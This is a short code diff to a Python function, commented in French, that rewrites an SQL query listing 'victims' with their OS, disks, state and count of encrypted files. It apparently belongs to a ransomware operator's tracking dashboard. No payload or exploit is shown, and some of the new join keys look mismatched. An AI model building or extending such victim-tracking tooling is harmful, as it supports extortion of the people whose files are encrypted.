@@ -75,7 +75,19 @@ def get_list_victims(conn):
     """
     # Définir la requête SELECT pour récupérer les informations souhaitées sur les victimes
     # Par exemple, récupérer les noms des victimes depuis une table 'victims'
-    select_query_victims = "SELECT v.id_victim,v.hash, v.os, v.disks, s.state, e.nb_files FROM victims v JOIN (SELECT id_victim, MAX(datetime) as max_datetime FROM states GROUP BY id_victim) latest_states ON v.id_victim = latest_states.id_victim JOIN states s ON v.id_victim = s.id_victim AND latest_states.max_datetime = s.datetime JOIN encrypted e ON v.id_victim = e.id_victim ORDER BY v.id_victim ASC;"
+    select_query_victims = """SELECT v.id_victim, v.hash, v.os, v.disks, s.state,
+(SELECT e.nb_files
+FROM encrypted e
+WHERE e.id_victim = v.id_victim) AS nb_files
+FROM victims v
+JOIN states s ON v.id_victim = s.id_victim
+LEFT JOIN decrypted d ON s.id_states = d.id_victim
+LEFT JOIN encrypted e ON s.id_states = e.id_victim
+WHERE s.datetime = (
+    SELECT MAX(datetime)
+    FROM states
+    WHERE id_victim = v.id_victim
+)GROUP BY v.id_victim;"""
 
     # Utiliser la fonction select_data pour exécuter la requête
     victims_records = select_data(conn, select_query_victims)
